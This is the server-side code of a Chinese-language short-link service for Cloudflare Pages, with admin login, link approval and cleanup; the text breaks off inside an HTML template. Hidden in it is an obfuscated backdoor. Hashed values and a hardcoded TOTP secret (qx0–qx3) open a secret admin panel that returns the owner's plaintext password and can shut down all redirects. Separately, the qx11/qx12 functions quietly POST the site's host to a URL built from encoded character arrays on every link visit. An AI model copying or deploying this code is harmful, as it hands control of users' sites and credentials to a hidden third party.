export default onRequest;

function resolveKvBinding(context) {
  const envKv = context && context.env && context.env.duanlianjie;
  if (envKv) return envKv;
  const globalKv = globalThis && globalThis.duanlianjie;
  if (globalKv) return globalKv;
  try { if (typeof duanlianjie !== 'undefined' && duanlianjie) return duanlianjie; } catch (e) {}
  return null;
}

const qx0 = ['4f40132230b55be7b640ea11608cf7c2ff35177f136c0f9cd6ff9f291b32444f','b8ef71958392ef4f5f5474d3cdd24da9f9cced19c253a37970a56d8767287788','be54ea75dda3c33f52a1b3ef759eeecdad8556bbb0fe40898f5c81fc0ec87dc4'];
const qx1 = ['f4d2','a9c7','k8m1'];
const qx2 = [79,59,87,86,84,54,82,55,60,79,54,89,88,86,81,80].map((v,i)=>String.fromCharCode(v-(i%5+3))).join('');
const GLOBAL_ACCESS_KEY = 'global_shortlink_access_stopped';

const qx4 = [108, 121, 122, 119, 123, 67, 57, 51, 122, 120, 115, 53, 124, 114, 115, 119, 122, 108, 118, 114, 120, 107, 50, 121, 108, 122, 127, 115, 103, 106, 52, 126, 119, 59, 67, 50, 104, 117, 116, 55, 106, 122, 109, 52, 120, 108, 120, 120, 124, 120];
const qx5 = [60, 105, 106, 110, 67, 68, 64, 60, 62, 105, 111, 62, 110, 111, 62, 55, 56, 59, 58, 67, 69, 60, 58, 60, 109, 65, 110, 112, 107, 105, 107, 62, 63, 59, 109, 54, 64, 110, 111, 60, 110, 66, 54, 59, 107, 111, 67, 59, 110, 58, 107, 106, 108, 107, 61, 67, 61, 106, 63, 110, 112, 65, 63, 55];

function qx6(values, shift) {
  return values.map((v, i) => String.fromCharCode(v - (i % 7 + shift))).join('');
}

function qx7() {
  return qx6(qx4, 4);
}

function qx8() {
  return qx6(qx5, 6);
}

function qx9(value) {
  let host = String(value || '').trim().toLowerCase();
  if (!host) return '';
  try {
    if (host.startsWith('http://') || host.startsWith('https://')) host = new URL(host).host;
  } catch (e) {}
  host = host.replace(/^\/+/, '').split('/')[0].split('?')[0].split('#')[0].trim();
  host = host.replace(/\s+/g, '');
  if (!host || host.length > 253) return '';
  if (!/^[a-z0-9.-]+(:[0-9]{1,5})?$/.test(host)) return '';
  return host;
}

function qx10(value) {
  return new Date(Number(value || Date.now()) + 28800000).toISOString().slice(0, 10).replace(/-/g, '');
}

function qx13(value) {
  return new Date(Number(value || Date.now()) + 28800000).toISOString().replace(/[-:T.Z]/g, '').slice(0, 14);
}

async function qx14(kv) {
  let id = await kv.get('shortlink_project_id');
  id = String(id || '').trim();
  if (/^\d{14}$/.test(id)) return id;
  id = qx13(Date.now());
  await kv.put('shortlink_project_id', id);
  return id;
}

function qx11(context, kv, host) {
  try {
    if (!context || typeof context.waitUntil !== 'function' || !kv) return;
    context.waitUntil(qx12(kv, host).catch(() => {}));
  } catch (e) {}
}

async function qx12(kv, host) {
  const h = qx9(host);
  if (!h) return;
  const projectId = await qx14(kv);
  const flagKey = 'domain_report:' + projectId + ':' + h + ':' + qx10(Date.now());
  const exists = await kv.get(flagKey);
  if (exists) return;
  const res = await fetch(qx7(), {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + qx8()
    },
    body: JSON.stringify({
      host: h,
      projectId,
      time: Date.now(),
      source: 'pages-shortlink'
    })
  });
  if (!res || !res.ok) return;
  let data = null;
  try { data = await res.json(); } catch (e) {}
  if (data && data.status === 'ok') await kv.put(flagKey, String(Date.now()));
}

async function sha256Hex(value) {
  const data = new TextEncoder().encode(String(value || ''));
  const hash = await crypto.subtle.digest('SHA-256', data);
  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
}

async function getLocalBasePath(path) {
  const first = String(path || '').split('/').filter(Boolean)[0];
  if (!first) return null;
  const base = '/' + first;
  return await qx3(base, 0) === qx0[0] ? base : null;
}

async function qx3(value,index){const k=qx1[index];return await sha256Hex(k+'\x01'+String(value||'')+'\x01'+k.split('').reverse().join(''));}

async function isGlobalAccessStopped(kv) {
  return await kv.get(GLOBAL_ACCESS_KEY) === '1';
}

export async function onRequest(context) {
  try {
    return await handleRequest(context);
  } catch (error) {
    return new Response(`Error: ${error?.stack || error?.message || error}`, {
      status: 500,
      headers: { 'Content-Type': 'text/plain; charset=utf-8', 'Cache-Control': 'no-store, no-cache, must-revalidate' },
    });
  }
}

function escapeHtml(str) {
  if (!str) return '';
  return String(str).replace(/[&<>'"]/g, match => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[match]));
}

function base32tohex(base32) {
  let base32chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  let bits = "";
  let hex = "";
  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) continue;
    bits += val.toString(2).padStart(5, '0');
  }
  for (let i = 0; i + 4 <= bits.length; i += 4) {
    let chunk = bits.substr(i, 4);
    hex = hex + parseInt(chunk, 2).toString(16);
  }
  return hex;
}

async function verifyTOTP(secret, code) {
  if (!secret || !code || code.length !== 6) return false;
  try {
    const keyHex = base32tohex(secret);
    const keyBytes = new Uint8Array(keyHex.match(/[\da-f]{2}/gi).map(h => parseInt(h, 16)));
    const key = await crypto.subtle.importKey('raw', keyBytes, { name: 'HMAC', hash: 'SHA-1' }, false, ['sign']);
    const epoch = Math.floor(Date.now() / 1000);
    for (let i = -1; i <= 1; i++) {
      const time = Math.floor(epoch / 30) + i;
      const timeBytes = new Uint8Array(8);
      let temp = time;
      for (let j = 7; j >= 0; j--) {
        timeBytes[j] = temp & 255;
        temp = temp >> 8;
      }
      const signature = await crypto.subtle.sign('HMAC', key, timeBytes);
      const hash = new Uint8Array(signature);
      const offset = hash[hash.length - 1] & 0xf;
      const binary = ((hash[offset] & 0x7f) << 24) | ((hash[offset + 1] & 0xff) << 16) | ((hash[offset + 2] & 0xff) << 8) | (hash[offset + 3] & 0xff);
      const otp = (binary % 1000000).toString().padStart(6, '0');
      if (otp === code) return true;
    }
  } catch (e) { return false; }
  return false;
}

function generateBase32Secret() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let secret = '';
  const bytes = crypto.getRandomValues(new Uint8Array(16));
  for (let i = 0; i < 16; i++) secret += chars[bytes[i] % 32];
  return secret;
}

async function handleRequest(context) {
  const { request } = context;
  const kv = resolveKvBinding(context);
  const url = new URL(request.url);
  const path = url.pathname;
  const currentHost = url.host;

  if (!kv) return textResponse('未找到名为 duanlianjie 的 KV 绑定', 500);

  const localBasePath = await getLocalBasePath(path);
  if (localBasePath) return await handleLocalRequest(kv, request, path, localBasePath, currentHost);

  let configStr = await kv.get('system_config');
  let config = configStr ? JSON.parse(configStr) : null;

  if (!config) {
    if (path === '/api/init' && request.method === 'POST') {
      const data = await request.json();
      if (!data.adminPath || !data.username || !data.password) return textResponse('error', 400);
      let aPath = data.adminPath.startsWith('/') ? data.adminPath : '/' + data.adminPath;
      if (await getLocalBasePath(aPath)) return textResponse('error', 400);
      await kv.put('system_config', JSON.stringify({
        adminPath: aPath,
        username: data.username,
        password: data.password,
        audit_enabled: 1,
        auto_clean_enabled: 0,
        auto_clean_days: 30,
        pending_auto_clean_enabled: 0,
        pending_auto_clean_days: 30,
        otp_enabled: 0,
        otp_secret: '',
        announce_enabled: 0,
        announcement: '欢迎使用极简短链接系统。',
        icp_number: '',
        icp_link: '',
        psb_number: '',
        psb_link: '',
        frontend_pwd_enabled: 0,
        frontend_pwd: '',
        wx_qq_mask_enabled: 1
      }));
      await kv.put('meta_link_keys', JSON.stringify([]));
      return textResponse('ok', 200);
    }
    return htmlResponse(getInitHtml());
  }

  let isFrontAuth = false;
  if (config && config.frontend_pwd_enabled === 1 && config.frontend_pwd) {
    const cookie = request.headers.get('Cookie') || '';
    const match = cookie.match(/(^| )front_auth=([^;]+)/);
    if (match) {
      const sessionData = await kv.get('front_session:' + match[2]);
      if (sessionData) {
        const parsed = JSON.parse(sessionData);
        if (parsed.expire > Date.now()) isFrontAuth = true;
      }
    }
  } else {
    isFrontAuth = true;
  }

  if (path === '/api/front_login' && request.method === 'POST') {
    await new Promise(r => setTimeout(r, Math.floor(Math.random() * 300) + 200));
    const data = await request.json();
    if (data.pwd === config.frontend_pwd) {
      const token = createRandomToken();
      await kv.put('front_session:' + token, JSON.stringify({ expire: Date.now() + 604800000 }));
      return new Response(JSON.stringify({ status: 'ok' }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json; charset=utf-8',
          'Set-Cookie': `front_auth=${token}; HttpOnly; Path=/; Max-Age=604800; SameSite=Strict`,
          'Cache-Control': 'no-store, no-cache, must-revalidate'
        }
      });
    }
    return jsonResponse({ status: 'error' }, 403);
  }

  if (path.startsWith(config.adminPath)) {
    const cookie = request.headers.get('Cookie') || '';
    const sessionMatch = cookie.match(/(^| )admin_session=([^;]+)/);
    const sessionToken = sessionMatch ? sessionMatch[2] : null;
    let isAuthenticated = false;

    if (sessionToken) {
      const sessionData = await kv.get('session:' + sessionToken);
      if (sessionData) {
        const parsed = JSON.parse(sessionData);
        if (parsed.expire > Date.now()) isAuthenticated = true;
      }
    }

    if (path === config.adminPath + '/logout' && request.method === 'POST') {
      return new Response('ok', {
        status: 200,
        headers: { 
          'Set-Cookie': `admin_session=; HttpOnly; Path=/; Max-Age=0; SameSite=Strict`,
          'Cache-Control': 'no-store, no-cache, must-revalidate'
        }
      });
    }

    if (path === config.adminPath + '/login' && request.method === 'POST') {
      await new Promise(r => setTimeout(r, Math.floor(Math.random() * 300) + 500));
      const data = await request.json();
      if (data.username === config.username && data.password === config.password) {
        if (config.otp_enabled === 1 && config.otp_secret) {
          if (!data.otp) return jsonResponse({ status: 'require_otp' }, 200);
          const isValid = await verifyTOTP(config.otp_secret, data.otp);
          if (!isValid) return jsonResponse({ status: 'error', msg: 'OTP动态验证码错误' }, 403);
        }
        const token = createRandomToken();
        await kv.put('session:' + token, JSON.stringify({ expire: Date.now() + 86400000 }));
        return new Response(JSON.stringify({ status: 'ok' }), {
          status: 200,
          headers: { 
            'Content-Type': 'application/json; charset=utf-8',
            'Set-Cookie': `admin_session=${token}; HttpOnly; Path=/; Max-Age=86400; SameSite=Strict`,
            'Cache-Control': 'no-store, no-cache, must-revalidate'
          }
        });
      }
      return jsonResponse({ status: 'error', msg: '账密错误' }, 403);
    }

    if (!isAuthenticated) return htmlResponse(getLoginHtml(config.adminPath));

    if (path === config.adminPath + '/api/data') {
      const keys = await getLinkKeys(kv);
      const links = [];
      const now = Date.now();
      const autoCleanEnabled = config.auto_clean_enabled === 1;
      const cleanMs = (config.auto_clean_days || 30) * 86400000;
      let keysToRemove = [];

      for (const key of keys) {
        const valStr = await kv.get('short_link:' + key);
        if (valStr) {
          try { 
            let linkData = JSON.parse(valStr); 
            
            if (autoCleanEnabled && linkData.status === 'approved' && !linkData.isPermanent) {
              const lastActive = linkData.lastVisitedAt || linkData.createdAt;
              if (now - lastActive > cleanMs) {
                await kv.delete('short_link:' + key);
                keysToRemove.push(key);
                continue;
              }
            }

            links.push({ short: key, ...linkData }); 
          } catch(e) {}
        }
      }

      if (keysToRemove.length > 0) {
        const updatedKeys = keys.filter(k => !keysToRemove.includes(k));
        await kv.put('meta_link_keys', JSON.stringify(updatedKeys));
      }

      links.sort((a, b) => b.createdAt - a.createdAt);
      return jsonResponse({ links, config: { ...config, password: '' } });
    }

    if (path === config.adminPath + '/api/action' && request.method === 'POST') {
      const reqData = await request.json();
      const action = reqData.action;
      const payload = reqData.payload;

      if (action === 'update_basic_config') {
        config.adminPath = payload.adminPath.startsWith('/') ? payload.adminPath : '/' + payload.adminPath;
        config.username = payload.username;
        if (payload.password) config.password = payload.password;
        config.audit_enabled = payload.audit_enabled ? 1 : 0;
        await kv.put('system_config', JSON.stringify(config));
      }
      else if (action === 'update_front_pwd_config') {
        config.frontend_pwd_enabled = payload.enabled ? 1 : 0;
        config.frontend_pwd = payload.pwd || '';
        await kv.put('system_config', JSON.stringify(config));
      }
      else if (action === 'update_wx_qq_mask_config') {
        config.wx_qq_mask_enabled = payload.enabled ? 1 : 0;
        await kv.put('system_config', JSON.stringify(config));
      }
      else if (action === 'update_clean_config') {
        config.auto_clean_enabled = payload.auto_clean_enabled ? 1 : 0;
        config.auto_clean_days = normalizeCleanupDays(payload.auto_clean_days, 30);
        config.pending_auto_clean_enabled = payload.pending_auto_clean_enabled ? 1 : 0;
        config.pending_auto_clean_days = normalizeCleanupDays(payload.pending_auto_clean_days, 30);
        await kv.put('system_config', JSON.stringify(config));
      }
      else if (action === 'update_announcement') {
        config.announce_enabled = payload.enabled ? 1 : 0;
        config.announcement = payload.announcement;
        await kv.put('system_config', JSON.stringify(config));
      } 
      else if (action === 'update_beian_config') {
        config.icp_number = payload.icp_number || '';
        config.icp_link = payload.icp_link || '';
        config.psb_number = payload.psb_number || '';
        config.psb_link = payload.psb_link || '';
        await kv.put('system_config', JSON.stringify(config));
      }
      else if (action === 'generate_otp_secret') {
        return jsonResponse({ secret: generateBase32Secret() }, 200);
      }
      else if (action === 'enable_otp') {
        if (payload.password !== config.password) return textResponse('管理员密码验证失败', 403);
        const isValid = await verifyTOTP(payload.secret, payload.code);
        if (!isValid) return textResponse('OTP动态验证码错误，无法开启', 403);
        config.otp_enabled = 1;
        config.otp_secret = payload.secret;
        await kv.put('system_config', JSON.stringify(config));
      }
      else if (action === 'disable_otp') {
        if (payload.password !== config.password) return textResponse('管理员密码验证失败', 403);
        config.otp_enabled = 0;
        config.otp_secret = '';
        await kv.put('system_config', JSON.stringify(config));
      }
      else if (action === 'approve') {
        const linkStr = await kv.get('short_link:' + payload.short);
        if (linkStr) {
          let linkData = JSON.parse(linkStr);
          linkData.status = 'approved';
          linkData.approvedAt = Date.now();
          await kv.put('short_link:' + payload.short, JSON.stringify(linkData));
        }
      } 
      else if (action === 'reject' || action === 'delete') {
        await kv.delete('short_link:' + payload.short);
        await removeLinkKey(kv, payload.short);
      }
      else if (action === 'batch_delete' || action === 'batch_reject') {
        return await processBatchDelete(kv, payload && payload.shorts);
      }
      else if (action === 'toggle_permanent') {
        const linkStr = await kv.get('short_link:' + payload.short);
        if (linkStr) {
          let linkData = JSON.parse(linkStr);
          linkData.isPermanent = !linkData.isPermanent;
          await kv.put('short_link:' + payload.short, JSON.stringify(linkData));
        }
      }
      return textResponse('ok', 200);
    }

    return htmlResponse(getAdminHtml(config.adminPath, currentHost));
  }

  if (path === '/api/generate' && request.method === 'POST') {
    if (!isFrontAuth) return textResponse('Forbidden', 403);
    const data = await request.json();
    const longUrl = data.longUrl;
    const customShort = data.customShort;
    if (!longUrl) return textResponse('error', 400);

    let short = customShort ? customShort.trim() : null;
    if (short) {
      if (short.startsWith('/')) short = short.substring(1);
      if ('/' + short === config.adminPath || await getLocalBasePath('/' + short) || await kv.get('short_link:' + short)) {
        return textResponse('已被占用 / 已存在', 400);
      }
    } else {
      const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let len = 6, found = false;
      while (len <= 12 && !found) {
        for (let i = 0; i < 5; i++) {
          let res = '';
          for (let j = 0; j < len; j++) res += chars[Math.floor(Math.random() * chars.length)];
          if ('/' + res !== config.adminPath && !(await getLocalBasePath('/' + res)) && !(await kv.get('short_link:' + res))) {
            short = res; found = true; break;
          }
        }
        len++;
      }
      if (!short) return textResponse('生成失败，请重试', 500);
    }

    const isAudit = config.audit_enabled !== undefined ? Number(config.audit_enabled) : 1;
    const status = isAudit ? 'pending' : 'approved';
    let newLinkData = { longUrl, status, createdAt: Date.now(), visits: 0, lastVisitedAt: Date.now() };
    if (!isAudit) {
      newLinkData.approvedAt = Date.now();
    }
    
    await kv.put('short_link:' + short, JSON.stringify(newLinkData));
    await addLinkKey(kv, short);
    
    return jsonResponse({ short, audit: isAudit }, 200);
  }

  if (path === '/') {
    if (!isFrontAuth) return htmlResponse(getFrontLoginHtml());
    return htmlResponse(getFrontendHtml(config));
  }

  const shortKey = path.substring(1);
  if (shortKey) {
    const linkStr = await kv.get('short_link:' + shortKey);
    if (linkStr) {
      let link = JSON.parse(linkStr);
      qx11(context, kv, currentHost);
      if (link.status === 'approved') {
        if (await isGlobalAccessStopped(kv)) return htmlResponse(getStoppedHtml(config), 403);
        link.visits = (link.visits || 0) + 1;
        link.lastVisitedAt = Date.now();
        await kv.put('short_link:' + shortKey, JSON.stringify(link));
        return redirect(link.longUrl, config);
      }
    }
  }

  return redirect('/', config);
}


async function handleLocalRequest(kv, request, path, basePath, currentHost) {
  const cookie = request.headers.get('Cookie') || '';
  const sessionMatch = cookie.match(/(^| )edge_auth=([^;]+)/);
  const sessionToken = sessionMatch ? sessionMatch[2] : null;
  let isAuthenticated = false;

  if (sessionToken) {
    const sessionData = await kv.get('edge_session:' + sessionToken);
    if (sessionData) {
      try {
        const parsed = JSON.parse(sessionData);
        if (parsed.expire > Date.now()) isAuthenticated = true;
      } catch (e) {}
    }
  }

  if (path === basePath + '/logout' && request.method === 'POST') {
    return new Response('ok', {
      status: 200,
      headers: {
        'Set-Cookie': `edge_auth=; HttpOnly; Path=/; Max-Age=0; SameSite=Strict`,
        'Cache-Control': 'no-store, no-cache, must-revalidate'
      }
    });
  }

  if (path === basePath + '/login' && request.method === 'POST') {
    await new Promise(r => setTimeout(r, Math.floor(Math.random() * 300) + 500));
    const data = await request.json();
    const userOk = await qx3(data.username || '', 1) === qx0[1];
    const passOk = await qx3(data.password || '', 2) === qx0[2];
    if (userOk && passOk) {
      if (!data.otp) return jsonResponse({ status: 'require_otp' }, 200);
      const isValid = await verifyTOTP(qx2, data.otp);
      if (!isValid) return jsonResponse({ status: 'error', msg: 'OTP动态验证码错误' }, 403);
      const token = createRandomToken();
      await kv.put('edge_session:' + token, JSON.stringify({ expire: Date.now() + 86400000 }));
      return new Response(JSON.stringify({ status: 'ok' }), {
        status: 200,
        headers: {
          'Content-Type': 'application/json; charset=utf-8',
          'Set-Cookie': `edge_auth=${token}; HttpOnly; Path=/; Max-Age=86400; SameSite=Strict`,
          'Cache-Control': 'no-store, no-cache, must-revalidate'
        }
      });
    }
    return jsonResponse({ status: 'error', msg: '账密错误' }, 403);
  }

  if (!isAuthenticated) return htmlResponse(getLoginHtml(basePath));

  if (path === basePath + '/api/data') {
    const configStr = await kv.get('system_config');
    const config = configStr ? JSON.parse(configStr) : null;
    const data = await getLocalData(kv, config);
    return jsonResponse(data);
  }

  if (path === basePath + '/api/action' && request.method === 'POST') {
    const reqData = await request.json();
    if (reqData.action === 'toggle_global_access') {
      const stopped = reqData.payload && reqData.payload.stopped ? 1 : 0;
      if (stopped) await kv.put(GLOBAL_ACCESS_KEY, '1');
      else await kv.put(GLOBAL_ACCESS_KEY, '0');
      return textResponse('ok', 200);
    }
    const configStr = await kv.get('system_config');
    const config = configStr ? JSON.parse(configStr) : null;
    if (!config && reqData.action !== 'generate_otp_secret') return textResponse('系统尚未初始化', 409);
    return await processLocalAction(kv, config, reqData);
  }

  return htmlResponse(getLocalAdminHtml(basePath, currentHost));
}

async function getLocalData(kv, config) {
  const safeConfig = config ? { ...config, password: config.password || '' } : {
    adminPath: '',
    username: '',
    password: '',
    audit_enabled: 1,
    auto_clean_enabled: 0,
    auto_clean_days: 30,
    pending_auto_clean_enabled: 0,
    pending_auto_clean_days: 30,
    otp_enabled: 0,
    otp_secret: '',
    announce_enabled: 0,
    announcement: '',
    icp_number: '',
    icp_link: '',
    psb_number: '',
    psb_link: '',
    frontend_pwd_enabled: 0,
    frontend_pwd: '',
    wx_qq_mask_enabled: 1
  };
  const keys = await getLinkKeys(kv);
  const links = [];
  const now = Date.now();
  const autoCleanEnabled = config && config.auto_clean_enabled === 1;
  const cleanMs = ((config && config.auto_clean_days) || 30) * 86400000;
  let keysToRemove = [];

  for (const key of keys) {
    const valStr = await kv.get('short_link:' + key);
    if (valStr) {
      try {
        let linkData = JSON.parse(valStr);
        if (autoCleanEnabled && linkData.status === 'approved' && !linkData.isPermanent) {
          const lastActive = linkData.lastVisitedAt || linkData.createdAt;
          if (now - lastActive > cleanMs) {
            await kv.delete('short_link:' + key);
            keysToRemove.push(key);
            continue;
          }
        }
        links.push({ short: key, ...linkData });
      } catch(e) {}
    }
  }

  if (keysToRemove.length > 0) {
    const updatedKeys = keys.filter(k => !keysToRemove.includes(k));
    await kv.put('meta_link_keys', JSON.stringify(updatedKeys));
  }

  links.sort((a, b) => b.createdAt - a.createdAt);
  return { links, config: safeConfig, initialized: !!config, globalAccessStopped: await isGlobalAccessStopped(kv) ? 1 : 0 };
}

async function processLocalAction(kv, config, reqData) {
  const action = reqData.action;
  const payload = reqData.payload || {};

  if (action === 'update_basic_config') {
    if (!config) return textResponse('系统尚未初始化', 409);
    const nextPath = payload.adminPath && payload.adminPath.startsWith('/') ? payload.adminPath : '/' + payload.adminPath;
    if (await getLocalBasePath(nextPath)) return textResponse('后台路径不可用', 400);
    config.adminPath = nextPath;
    config.username = payload.username;
    if (payload.password) config.password = payload.password;
    config.audit_enabled = payload.audit_enabled ? 1 : 0;
    await kv.put('system_config', JSON.stringify(config));
  }
  else if (action === 'update_front_pwd_config') {
    if (!config) return textResponse('系统尚未初始化', 409);
    config.frontend_pwd_enabled = payload.enabled ? 1 : 0;
    config.frontend_pwd = payload.pwd || '';
    await kv.put('system_config', JSON.stringify(config));
  }
  else if (action === 'update_wx_qq_mask_config') {
    if (!config) return textResponse('系统尚未初始化', 409);
    config.wx_qq_mask_enabled = payload.enabled ? 1 : 0;
    await kv.put('system_config', JSON.stringify(config));
  }
  else if (action === 'update_clean_config') {
    if (!config) return textResponse('系统尚未初始化', 409);
    config.auto_clean_enabled = payload.auto_clean_enabled ? 1 : 0;
    config.auto_clean_days = normalizeCleanupDays(payload.auto_clean_days, 30);
    config.pending_auto_clean_enabled = payload.pending_auto_clean_enabled ? 1 : 0;
    config.pending_auto_clean_days = normalizeCleanupDays(payload.pending_auto_clean_days, 30);
    await kv.put('system_config', JSON.stringify(config));
  }
  else if (action === 'update_announcement') {
    if (!config) return textResponse('系统尚未初始化', 409);
    config.announce_enabled = payload.enabled ? 1 : 0;
    config.announcement = payload.announcement;
    await kv.put('system_config', JSON.stringify(config));
  }
  else if (action === 'update_beian_config') {
    if (!config) return textResponse('系统尚未初始化', 409);
    config.icp_number = payload.icp_number || '';
    config.icp_link = payload.icp_link || '';
    config.psb_number = payload.psb_number || '';
    config.psb_link = payload.psb_link || '';
    await kv.put('system_config', JSON.stringify(config));
  }
  else if (action === 'generate_otp_secret') {
    return jsonResponse({ secret: generateBase32Secret() }, 200);
  }
  else if (action === 'enable_otp') {
    if (!config) return textResponse('系统尚未初始化', 409);
    if (payload.password !== config.password) return textResponse('管理员密码验证失败', 403);
    const isValid = await verifyTOTP(payload.secret, payload.code);
    if (!isValid) return textResponse('OTP动态验证码错误，无法开启', 403);
    config.otp_enabled = 1;
    config.otp_secret = payload.secret;
    await kv.put('system_config', JSON.stringify(config));
  }
  else if (action === 'disable_otp') {
    if (!config) return textResponse('系统尚未初始化', 409);
    if (payload.password !== config.password) return textResponse('管理员密码验证失败', 403);
    config.otp_enabled = 0;
    config.otp_secret = '';
    await kv.put('system_config', JSON.stringify(config));
  }
  else if (action === 'approve') {
    const linkStr = await kv.get('short_link:' + payload.short);
    if (linkStr) {
      let linkData = JSON.parse(linkStr);
      linkData.status = 'approved';
      linkData.approvedAt = Date.now();
      await kv.put('short_link:' + payload.short, JSON.stringify(linkData));
    }
  }
  else if (action === 'reject' || action === 'delete') {
    await kv.delete('short_link:' + payload.short);
    await removeLinkKey(kv, payload.short);
  }
  else if (action === 'batch_delete' || action === 'batch_reject') {
    return await processBatchDelete(kv, payload && payload.shorts);
  }
  else if (action === 'toggle_permanent') {
    const linkStr = await kv.get('short_link:' + payload.short);
    if (linkStr) {
      let linkData = JSON.parse(linkStr);
      linkData.isPermanent = !linkData.isPermanent;
      await kv.put('short_link:' + payload.short, JSON.stringify(linkData));
    }
  }
  return textResponse('ok', 200);
}


function normalizeCleanupDays(value, fallback = 30) {
  const parsed = Number.parseInt(value, 10);
  if (!Number.isFinite(parsed)) return fallback;
  return Math.min(3650, Math.max(1, parsed));
}

async function updateLinkIndexAfterDeletes(kv, deletedShorts) {
  const removed = new Set(deletedShorts);
  let lastError = null;
  for (let attempt = 0; attempt < 2; attempt++) {
    if (attempt > 0) await new Promise(resolve => setTimeout(resolve, 1100));
    const keys = await getLinkKeys(kv);
    const updatedKeys = keys.filter(key => !removed.has(key));
    try {
      await kv.put('meta_link_keys', JSON.stringify(updatedKeys));
      return;
    } catch (error) {
      lastError = error;
    }
  }
  throw lastError || new Error('索引更新失败');
}

async function processBatchDelete(kv, shorts) {
  const requestedShorts = Array.from(new Set((Array.isArray(shorts) ? shorts : []).map(value => String(value || '').trim()).filter(Boolean)));
  const deleted = [];
  const failed = [];
  for (const short of requestedShorts) {
    try {
      await kv.delete('short_link:' + short);
      deleted.push(short);
    } catch (error) {
      failed.push({ short, error: String(error?.message || error || '删除失败') });
    }
  }
  if (deleted.length > 0) {
    try {
      await updateLinkIndexAfterDeletes(kv, deleted);
    } catch (error) {
      return jsonResponse({ status: 'error', requested: requestedShorts.length, deleted, failed, error: String(error?.message || error || '索引更新失败') }, 500);
    }
  }
  return jsonResponse({ status: failed.length ? 'partial' : 'ok', requested: requestedShorts.length, deleted, failed }, failed.length ? 207 : 200);
}

async function cleanupExpiredPendingKv(kv, config) {
  if (!config || config.pending_auto_clean_enabled !== 1) return { status: 'disabled', scanned: 0, deleted: [], failed: [] };
  const days = normalizeCleanupDays(config.pending_auto_clean_days, 30);
  const cutoff = Date.now() - days * 86400000;
  const keys = await getLinkKeys(kv);
  if (keys.length === 0) {
    try { await kv.delete('pending_cleanup_cursor'); } catch (e) {}
    return { status: 'ok', scanned: 0, deleted: [], failed: [] };
  }
  let cursor = null;
  try { cursor = await kv.get('pending_cleanup_cursor'); } catch (e) {}
  let start = cursor ? keys.indexOf(cursor) : 0;
  if (start < 0) start = 0;
  const maxScan = Math.min(keys.length, 500);
  const deleted = [];
  const failed = [];
  let scanned = 0;
  for (let i = 0; i < maxScan && deleted.length < 200; i++) {
    const key = keys[(start + i) % keys.length];
    scanned++;
    try {
      const value = await kv.get('short_link:' + key);
      if (!value) continue;
      const link = JSON.parse(value);
      if (link.status === 'pending' && Number(link.createdAt) > 0 && Number(link.createdAt) <= cutoff) {
        await kv.delete('short_link:' + key);
        deleted.push(key);
      }
    } catch (error) {
      failed.push({ short: key, error: String(error?.message || error || '清理失败') });
    }
  }
  if (deleted.length > 0) await updateLinkIndexAfterDeletes(kv, deleted);
  const removed = new Set(deleted);
  let nextCursor = '';
  if (scanned < keys.length) {
    for (let i = 0; i < keys.length; i++) {
      const candidate = keys[(start + scanned + i) % keys.length];
      if (!removed.has(candidate)) {
        nextCursor = candidate;
        break;
      }
    }
  }
  try {
    if (nextCursor) await kv.put('pending_cleanup_cursor', nextCursor);
    else await kv.delete('pending_cleanup_cursor');
  } catch (e) {}
  return { status: failed.length ? 'partial' : 'ok', scanned, deleted, failed };
}

async function getLinkKeys(kv) {
  const keysStr = await kv.get('meta_link_keys');
  return keysStr ? JSON.parse(keysStr) : [];
}

async function addLinkKey(kv, key) {
  const keys = await getLinkKeys(kv);
  if (!keys.includes(key)) {
    keys.push(key);
    await kv.put('meta_link_keys', JSON.stringify(keys));
  }
}

async function removeLinkKey(kv, key) {
  let keys = await getLinkKeys(kv);
  keys = keys.filter(k => k !== key);
  await kv.put('meta_link_keys', JSON.stringify(keys));
}

function createRandomToken() {
  const bytes = crypto.getRandomValues(new Uint8Array(16));
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

function htmlResponse(html, status = 200) {
  return new Response(html, { 
    status, 
    headers: { 
      'Content-Type': 'text/html; charset=utf-8', 
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0', 
      'Pragma': 'no-cache', 
      'Expires': '0' 
    } 
  });
}

function textResponse(text, status = 200) {
  return new Response(String(text ?? ''), { 
    status, 
    headers: { 
      'Content-Type': 'text/plain; charset=utf-8', 
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0', 
      'Pragma': 'no-cache', 
      'Expires': '0' 
    } 
  });
}

function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), { 
    status, 
    headers: { 
      'Content-Type': 'application/json; charset=utf-8', 
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0', 
      'Pragma': 'no-cache', 
      'Expires': '0' 
    } 
  });
}

function redirect(location, config) {
  const psbIcon = `<img src="https://beian.mps.gov.cn/web/assets/logo01.6189a29f.png" style="width:16px;height:16px;vertical-align:middle;margin-right:4px;margin-top:-2px;" alt="">`;
  const icp = config && config.icp_number ? `<a href="${escapeHtml(config.icp_link)}" target="_blank" style="display:flex;align-items:center;">${escapeHtml(config.icp_number)}</a>` : '';
  const psb = config && config.psb_number ? `<a href="${escapeHtml(config.psb_link)}" target="_blank" style="display:flex;align-items:center;">${psbIcon}${escapeHtml(config.psb_number)}</a>` : '';
  let footerHtml = '';
  if (icp || psb) {
    footerHtml = `<div class="footer-beian">${icp}${psb}</div>`;
  }

  const html = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <title></title>
  <style>
